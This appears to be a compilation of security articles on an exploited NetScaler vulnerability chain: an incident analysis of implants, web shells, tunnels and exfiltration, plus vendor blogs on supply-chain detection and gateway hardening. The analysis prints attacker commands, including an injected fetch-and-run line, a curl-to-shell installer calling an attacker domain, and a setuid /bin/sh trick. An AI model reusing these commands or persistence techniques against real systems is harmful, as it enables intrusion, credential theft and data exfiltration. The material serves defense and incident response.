The implant framework maintained access through cron, rc.netscaler, watchdog loops, an outbound reverse agent, and an HTTP-fronted TCP proxy.

HA synchronization and forced failover logic attempted to preserve access across the appliance pair.

A Go tool mapped internal routes, DNS, LDAP/AD, management services and VMware vCenter systems.

NetScaler configuration, historical configurations, HTTP configuration, diagnostics and system backup material were staged for exfiltration.

Technical Analysis

Initial access

The first event was an authentication request containing attacker-controlled text similar to:

pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;#

The observed chain was:

Figure 1: Sequence diagram showing the attack chain

Logs collected show attackers chaining CVE-2026-88771, the pre-authentication log-poisoning/RCE issue, with CVE-2026-88779, the separate SAML-parsing crash. A two-vulnerability sequence in which the SAML parsing flaw supplies a crash/reboot condition while the log-poisoning flaw supplies attacker-controlled command text.

The evidence demonstrates more than an attempted chain: the injected command, nsaaad crash loop, Pitboss reboot, post-reboot handler activity, and root payload execution are all directly correlated across independent logs and filesystem timestamps. The first implant files were created at the same second as the first logged post-reboot execution, and later stages, web shells, tunnels, reconnaissance tooling and exfiltration were confirmed.

Rapid7 also published an ETR on the Netscaler zero days currently exploited in the wild.

Repeated post-reboot execution

The initial execution was not a one-time event. The appliance recorded repeated Pitboss-initiated reboots and repeated call-home handler executions over several days.

The handler re-executed stages from multiple infrastructure addresses and the repeated execution model allowed the operator to refresh persistence, deploy new components and continue collection after appliance restarts.

The crash-handling path functioned as a delayed and repeatable execution trampoline, the chaining happened to avoid waiting 24h for the injected payload to run.

Payload evolution

Two .slap dropper versions were recovered:

17447d.sh (earlier version) SHA-256: a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556

and:

1.sh SHA-256: 6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44

The later version added reverse-agent functionality, relay installation, HA recovery, stage tracking, and structured upload logging, indicating operational maturation during the campaign.

The nsvmd installer branch was separately identified as:

2.sh / r.sh SHA-256: 56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186

Persistence and web shells

The main framework used a directory under /nsconfig/.slap.

/nsconfig/.slap/vc /nsconfig/.slap/vcscan-agent.sh /nsconfig/.slap/agent.pl /nsconfig/.slap/bridge.pl /nsconfig/.slap/boot.sh /nsconfig/.slap/reverse-agent.sh

It deployed three web shell copies into the LogonPoint custom web directory:

.slap.receiver .ctxs.receiver receiver.deb

The shells used a cookie-based command channel. Commands were supplied through a second cookie and returned through an HTTP 404 response body. The 404 response helped the shell blend into normal web traffic and made successful command requests resemble missing resources.

The attacker modified Apache configuration to:

execute .deb files as PHP;

enable PHP execution;

map CSS-looking URLs to .slap.receiver;

accept randomized hexadecimal CSS suffixes;

preserve an attacker backup of the HTTP configuration.

The alias created were the following:

/logon/LogonPoint/custom/receiver.v2.min.css /logon/LogonPoint/custom/receiver.v2.min.<hex>.css ↓ /var/netscaler/logon/LogonPoint/custom/.slap.receiver

TA repeatedly set:

chmod 6555 /bin/sh

This made the shell setuid and setgid. Because Apache normally runs with reduced privileges, this provided a path for the PHP web shell to obtain effective root privileges.

The framework also reseeded cron entries and boot hooks whenever it ran. This made the compromise resilient to reboots, image regeneration and loss of individual cron entries.

Tunnelling and command channels

The intrusion deployed multiple redundant access paths.

Perl TCP session manager

agent.pl created a loopback listener on an ephemeral port and recorded it in /tmp/.uxdport

It used /tmp/.uxdlock for process coordination and supported operations including:

ping open push pull exch close

The open operation accepted arbitrary destination hosts and ports, turning the NetScaler into an internal TCP pivot.

Python HTTP tunnel

The Python components provided a local session manager and HTTP front end:

it accepted base64 commands in an HTTP header and returned tunnel responses in HTTP 404 bodies. This behavior overlaps with publicly reported WHIPSHOT/SLAPSHOT tooling.

Outbound reverse agent

The reverse agent polled an external command endpoint every 15 seconds, executed the received command with /bin/sh -c, and returned output using HTTP PUT. This gave the operator command execution without requiring an inbound connection to the appliance.

HA-aware persistence

The framework included explicit HA recovery logic:

sync HA files all force HA failover

The code attempted to synchronize implant files to the HA peer and, when appropriate, force failover so the node containing the implant became active.

Internal reconnaissance

A stripped, statically linked FreeBSD Go binary was recovered from the .slap directory. The tool was designed to map infrastructure reachable from the compromised appliance.

It contains functionality associated with:

local interface and route parsing;

gateway-prefix discovery;

subnet expansion;

DNS server and domain discovery;

DNS zone-transfer hunting;

LDAP anonymous bind and RootDSE queries;

LDAP searches;

management-service checks;

TLS certificate inspection;

VMware vCenter classification.

A launcher named vcscan-agent.sh downloaded and validated the scanner as scanner-freebsd-amd64, installed it as /nsconfig/.slap/vc, and ran two stages: broad scanning of RFC1918 space and management-focused scanning of ranges derived from DNS and LDAP results. The launcher collected route, DNS, LDAP, management and vCenter results into files such as:

vcpersist-<token>_dns_candidates.tsv vcpersist-<token>_dns_ldap_verified.tsv vcpersist-<token>_vcenter_verified_all.txt

It then compressed and uploaded the results to the operator infrastructure.

This reconnaissance component addition confirms the campaign is active and developing, mapping the identity, management and virtualization infrastructure from a compromised ADC vantage point.

nsvmd proxy

The second payload branch deployed a FreeBSD Go agent named nsvmd through injection of 2.sh/r.sh under /flash/.nsvm/nsvmd:

curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<token>|sh

The agent was started with:

nsvmd -server v5v.in:443 -sni c.v5v.in

The installer created a 45s watchdog (/flash/.nsvm/watchdog.sh), boot persistence through /nsconfig/rc.netscaler, 5 minute and daily cron persistence (/flash/.nsvm/guard.sh,/flash/.nsvm/restart.sh) marking nsvmd immutable using chflags uchg. Agent logs were collected under /flash/.nsvm/.agent.log and /flash/.nsvm/.wd.log.

Configuration and key-material collection

The attacker staged and uploaded:

/nsconfig/ ns.conf.0 through ns.conf.4 ns.conf.bak /etc/httpd.conf system backup archives implant diagnostics

The configuration archive could contain encrypted credentials, LDAP/RADIUS bind information, administrative configuration, SSL private keys and key-encryption material. The collection logic also uploaded manifests and stage logs and retried failed uploads.

A separate archive was staged in the web root and successfully downloaded through an HTTP 200 request. The response size matched the staged archive size, providing direct evidence of configuration exfiltration through the web interface.

Title: Supply Chain Zero Days: Closing the Gap Between Publication and Detection
Context: By analyzing new npm package versions as they are published and distributing confirmed threat intelligence across the platform, Wiz helps teams identify compromised packages...
Full Text:
Modern software development depends on open source packages. Developers and AI coding agents can pull new dependencies and versions into projects at speed, helping teams build and ship faster.

But that speed creates a challenge for security teams. When a trusted package is compromised, malicious code can enter development environments and build pipelines before traditional vulnerability databases flag the threat.

Organizations cannot manually review or block every update to foundational packages without slowing development. Therefore, most organizations scan newly downloaded packages against known vulnerabilities and block if needed. But, zero-day supply chain compromises won’t show up in vulnerability databases right away; and, because popular packages are already trusted, developer workflows and build pipelines are often configured to automatically pull their latest versions. If an attacker compromises one of those packages, a malicious update can spread across the environment before a CVE is even published, leaving security teams to defend from behind.

Trusted package compromises in the wild

Our own research team is seeing this technique in practice more often than ever before. In H2 2025, notable supply chain attacks made up about 10% of significant incidents. In H1 2026, that percentage increased to 25%, and now, notable supply chain attacks account for 1 in 4 significant security incidents. During the Axios compromise, for example, an unknown threat actor compromised the npm account of an axios maintainer and published two malicious versions of the npm package (v1.14.1, v0.30.4), which introduced a dependency on plain-crypto-js, a newly created malicious package.

Although the malicious versions were removed within hours, that didn't mean that the threat disappeared. According to the Wiz Research team’s own observations, at the time, Axios was present in approximately 80% of cloud and code environments, and downloaded around 100 million times per week. The package’s popularity enabled rapid exposure, with observed execution in 3% of affected environments. This reality underlines the importance of speed in defending against supply chain attacks.

Detecting malicious packages at publication

Traditionally, security teams find out a trusted package was compromised by receiving a threat advisory or vulnerability database update. In an ideal world, teams could take a proactive approach to securing the software supply chain by knowing which packages published to npm are clean, preventing installation of those that are not, and alerting on malicious versions across all tools.

That’s why we built a dedicated supply chain detection pipeline to analyze new packages and versions as soon as they are published to npm. This allows us to flag malicious packages and add detection rules in Wiz Defend, code and cloud pipelines, all before a formal CVE is published.

Here’s how it works:

When a new package version is released, the pipeline downloads and extracts the current version and previous versions for comparison.

Static analysis techniques flag suspicious files. This analysis feeds into our AI classifier engine, which returns an initial verdict.

Suspicious versions undergo dynamic analysis to validate the verdict. This dynamic analysis involves in depth work to understand the file contents, including:

Installing the package version in a sandbox environment to monitor runtime activity.

Importing the version and exposed modules .

Running the package from the CLI (where possible).

The Wiz Sensor observes runtime behavior to monitor for malicious activity. This helps the pipeline confirm the suspicious verdict, and provides our AI classifier with additional evidence.

The AI classifier returns the final verdict, generated based on all previous analyses. Once a version is confirmed as malicious, the pipeline automatically publishes IOCs to the Wiz reputation service. This ensures that Wiz customers are alerted as soon as a package enters their environment, via:

Threat intelligence center notifications, alerting on compromised packages so teams can understand if they are impacted.

Code and cloud scanning pipelines, surfacing malicious package findings wherever detected.

Wiz Defend, with auto-updated detection rules for malicious packages and configurable runtime detection and response policies.

Combining various analysis methods and live runtime execution allows us to flag zero-day compromises at speed while keeping false positives to a minimum.

Detection in the real world

A notable example of the pipeline in action is the keyv attack, where multiple npm packages in the keyv/cacheable ecosystem were compromised following the compromise of a GitHub maintainer account. In this particular case, instead of hardcoding command-and-control (C2) domains into the package source code, where static rules could easily extract and block them, the malware dynamically retrieved its C2 domains at runtime by querying an Ethereum smart contract. Because the malicious domains never appeared in the code itself, traditional static analysis alone could not identify the C2 infrastructure.

Using the supply chain pipeline, the Wiz Research Team was able to successfully see network activity to the malicious domain, automatically detecting the malicious domain connection without human intervention. Combining static and dynamic analysis, along with AI classification and live runtime monitoring, helped the pipeline flag the package with high confidence. As soon as the package was confirmed malicious, the relevant information automatically pushed to Wiz Defend and across the Wiz platform, enabling customers to detect compromised keyv versions in their environments before a formal CVE was published.

Proactive detection of compromised packages with Wiz

Open source packages are fundamental to the modern software development ecosystem. As workflows accelerate, security teams need real-time visibility and control over third-party dependencies before malicious code can land on developer workstations or build pipelines.

By analyzing new npm package versions as they are published and distributing confirmed threat intelligence across the platform, Wiz helps teams identify compromised packages before traditional vulnerability signals become available. In addition, Wiz evaluates dependencies during each install or upgrade process, to help security teams detect and manage risky or compromised package versions at the exact point of ingestion.

The goal is simple: empower security and development teams to move at machine speed, with the visibility and control over what enters the software supply chain.

Title: Beyond the patch: Protecting your NetScaler gateway against future vulnerabilities
Context: The recent disclosure of a major vulnerability in Citrix NetScaler pointed to a widespread weak point: a login page is an attack surface that can be used to compromise and...
Full Text:
The recent disclosure of a major vulnerability in Citrix NetScaler pointed to a widespread weak point: a login page is an attack surface that can be used to compromise and access an application server. Indeed, the disclosures included an actively exploited flaw that allowed attackers to execute commands on affected gateways without signing in. As with any emergency patch, admins had to weigh cutting off or disrupting their users’ access with the risk of delaying a critical security update.

If you’re a NetScaler customer and you haven’t patched your instance, stop reading and go do that. This was a bad one. Once you’ve finished the patch, we’ll explore how to avoid a future fire drill by laying additional security controls.

This issue extends beyond NetScaler and can be applied to any internal application available on the Internet. Remote desktop portals, administrative consoles, and other publicly accessible authentication pages all deserve the same scrutiny: Does the intended audience require unrestricted Internet reachability? And can an attacker bypass this authentication check to reach the application's server?

Citrix released software updates to address the flaw, and Cloudflare followed with an emergency web application firewall (WAF) rule on October 1. But having a patch available does not guarantee safety: every instance has to be identified, updated, and tested. Applying updates across a production deployment is painful — it can result in downtime or cause disruptions to employees who still need their desktops throughout that process. Customers, patients, and others dependent on users of a remote desktop definitely don’t care about your security patch.

Using a web application firewall (WAF) can buy some additional time before a patch can be fully rolled out, but it’s reactive and does not account for the next exploit that’s discovered. Cloudflare and other security vendors do their best to cover variations and similar attacks. But AI is hastening how rapidly attackers can discover new and novel variants. That’s why it is crucial to build defense in depth, to ensure that no specific software failure or exploit will lead to a critical security issue.

Cloudflare combines access policies, web application security, and restricted origin connections to protect the authentication service before a new vulnerability is disclosed. Access controls limit who can reach the application server; WAF inspection evaluates web requests for attacks; origin restrictions prevent direct connections from bypassing those defenses. These reduce exposure without waiting for a new exploit signature or replacing the existing desktop platform.

The NetScaler exploit

Citrix's September 27, 2026 bulletin reported observed exploitation of CVE-2026-88771 and CVE-2026-88772. The first allows unauthenticated command execution on affected appliances, including in their default configuration. The second affects configurations using Datagram Transport Layer Security, or DTLS. Further advisories on October 3 and October 8 addressed additional vulnerabilities in SAML configurations. These exploits allowed attackers to execute arbitrary scripts on target machines and also execute denial of service attacks.

CISA's alert and Mandiant's technical investigation cover the vulnerabilities, observed exploitation, and response guidance in more detail. For details of the available web application protection, see Cloudflare's emergency WAF release for CVE-2026-88771.

In a typical Citrix deployment, the user authenticates through NetScaler Gateway, which then uses a secure ticket authority to pass through to the StoreFront, which presents the applications and desktops available to that user. The native-installed Citrix app then uses that information to establish a separate connection using Citrix's Independent Computing Architecture (ICA) protocol. The gateway validates the ticket before proxying the desktop connection. Citrix documents these as distinct stages of the connection workflow. The entire exploit stems from the fact that the Gateway has to be publicly accessible on the Internet, otherwise users would not be able to initiate their desktop connection.

Put the access decision in front of the authentication server

The best thing that you can do, after patching all your instances, is move any publicly accessible login pages or applications behind single sign-on before the request ever hits the target server. Cloudflare Access can enforce an independent access policy before the request reaches the existing gateway server. The Citrix environment continues to determine which desktop the user may launch and to validate the resulting session ticket. The additional boundary ensures that an attacker could never get to the Gateway server to try running specific exploits. They would only see the Cloudflare Access login page.

That decision no longer depends on recognizing an exploit signature and blocking that way, but rather on a set of Zero Trust policies that determine if someone should even be there to begin with. More attacks like this are coming, and adopting Zero Trust controls throughout your network is the single most important thing you should do next.

This follows the principle described in Cloudflare's own architecture as customer zero: reduce exposure and use independent defenses so that one flaw does not become a compromise. Here, the practical starting point is the service that users reach before they enter their applications.

Protecting the web authentication path adds a boundary in front of the existing Citrix controls. It does not automatically extend that boundary to other gateway services, including DTLS-enabled listeners. Those interfaces still need their own exposure review and applicable security updates, even when the desktop sessions they support already require authentication.

The origin connection must enforce the same boundary

Changing a DNS record and enforcing Access policies are not enough. If an attacker can connect to the original address or an alternate hostname, they can avoid the controls placed in front of it. Access enforces a specific hostname: if the authentication server can be reached via an IP address or alternative hostname, then the Access policy enforcement is worthless. It’s important to take steps to ensure that all traffic comes from a request that was validated by Access. There are a few different approaches to accomplish this, based on your internal architecture.

Cloudflare Tunnel is the most commonly used approach. It establishes an outbound only tunnel from your application server and allows you to close all inbound IP traffic. This means that you won’t have a public IP for the server that can be reached by anyone.

When a public origin IP Address must remain or connector software cannot be run, network restrictions and origin authentication need to constrain the connections it accepts. For example, Dedicated CDN Egress IPs give an account dedicated source addresses for traffic from Cloudflare to its origins. The application server’s firewall can allow those addresses and reject other sources. This makes the network restriction specific to the account's traffic, rather than broadly allowing traffic from Cloudflare's shared address ranges.

Authenticated Origin Pulls can add further depth with mutual TLS to verify the Cloudflare-to-origin connection.

An origin that supports it can also validate the Access JSON Web Token, including its signature, issuer, expiry, and intended application audience. This is the best way to guarantee that a request was authenticated by Access.

If you're unsure where to start, speak with a Cloudflare expert to review your architecture and identify which controls fit your environment.

Protect the web-facing authentication service

Cloudflare Access determines who may reach the web application; Cloudflare's web application firewall (WAF) inspects HTTP requests to that same protected service. The WAF runs before any Access authentication checks, which gives you the ability to completely block known malicious IPs, specific countries, ASNs, or other attributes you know definitely shouldn’t be accessing your applications. The firewall runs continuously on all requests and will also identify users who managed to authenticate attempting to run exploits with known CVE signatures.

Alongside managed CVE signatures, WAF Attack Score uses machine learning to identify potentially malicious requests that do not exactly match a known rule. Administrators can use the score in rules that block or challenge requests. The WAF attack score is powered by network observations from Cloudflare's global network traffic and Cloudforce One investigations feed Cloudflare's shared threat-intelligence platform.

Customers with a Cloudforce One threat intelligence subscription can also use live threat indicators in WAF policies. That adds context about known malicious sources alongside inspection of the request itself.

Reducing exposure does not remove an attacker who already has a foothold. Seriously: go patch your system if you haven’t, and follow Citrix's suspected-compromise guidance. They lay out how to preserve evidence, revoke credentials and certificates, investigate connected systems, and rebuild or restore from a known-good state.

Extend Zero Trust to desktop access, or remove the desktop dependency

Protecting web authentication can be an initial step without making it the final architecture. Cloudflare's Zero Trust architecture for virtual desktops also supports controlling access to the desktop infrastructure itself. With the Cloudflare One Client and private-network connectivity, teams can restrict who and which devices may reach the endpoints carrying desktop traffic, including an existing Independent Computing Architecture (ICA) path. This requires its own routing and policy design; it is not a capability supplied by the browser authentication proxy alone.

Some workflows can remove the ICA dependency instead. For supported Windows workloads, Cloudflare's browser-based remote desktop access connects users to a Windows host through Cloudflare Tunnel, without a local remote desktop client. If users only need a desktop to open web applications, Access and Browser Isolation can replace that web-access use case without a full virtual desktop.

Start by protecting the authentication service and existing desktop connections. Then replace virtual desktops used only for web access, and move supported Windows workflows to browser-based remote desktops. Reducing exposure does not have to wait for a full desktop migration.

Decide which authentication services need to be public

The same assessment applies beyond virtual desktops. An employee portal or management console may need to be reachable by approved users from anywhere, without needing to accept application requests from everyone.

Not every authentication page can require a prior employee identity. Consumer login pages and the identity-provider endpoints required to establish an initial session may need to remain publicly reachable. Protect those intentionally, and avoid introducing circular authentication dependencies. The point is to make reachability a design decision rather than an inherited default.

Start with one restricted service. Map the web and non-web paths into it, then put the access decision ahead of its authentication surface. Before expanding the rollout, validate the boundary in your own environment:

Request the protected hostname without signing in. Confirm the request stops at Cloudflare rather than reaching the origin.

Sign in with a test account outside the permitted group. Confirm it still cannot reach the protected application.

Test direct-origin addresses and alternate hostnames. Confirm none bypasses the access policy.

Sign in as an approved user. Confirm authentication, desktop launch, and session reconnection still work.

Check the relevant policy, firewall, and origin logs rather than relying only on what the browser displays. Repeat these checks when routing, identity, or failover settings change, so the next configuration update does not quietly reopen the path you closed.

Bring the controls together

The full architecture brings the access decision, web inspection, and availability controls in front of NetScaler, with restrictions on the connection to the origin. The public origin and Tunnel paths are alternatives. The native desktop connection remains separate, with an optional Zero Trust network access layer around that traffic.

Full Text:
IntroductionOn September 27, 2026, Citrix disclosed CVE-2026-88771, a critical remote code execution (RCE) vulnerability affecting NetScaler Application Delivery Controller (ADC) and NetScaler Gateway. The vulnerability carries a CVSS v3.1 score of 9.8 according to NVD and a CVSS v4.0 score of 9.5 according to the Citrix security bulletin CTX697096. The vulnerability allows unauthenticated attackers to execute arbitrary commands on affected appliances. Exploitation requires no optional features to be enabled.Citrix confirmed exploitation on unmitigated appliances, and the US’s Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-88771 to its Known Exploited Vulnerabilities catalog following reports of active exploitation worldwide. Citrix has since disclosed another critical vulnerability affecting NetScaler ADC and NetScaler Gateway, CVE-2026-107406, which can lead to RCE or denial of service. CVE-2026-107406 affects appliances configured as SAML service provider or identity provider depending on the software version. The analysis in this blog focuses on the exploitation of CVE-2026-88771.Zscaler ThreatLabz observed a staged exploitation chain involving access-log poisoning, remote command execution before authentication, appliance fingerprinting, and attempts to deploy multiple web shells. ThreatLabz also observed delivery of a FreeBSD x64 implant from infrastructure that overlapped with activity we previously associated with exploitation of StyleSmuggler (CVE-2026-75650), a vulnerability affecting Adobe Commerce and Magento.This overlap provides an investigative lead but does not establish threat actor attribution. Shared hosting and compromised infrastructure, malware distribution services, or payload reuse by unrelated operators could explain the connection.
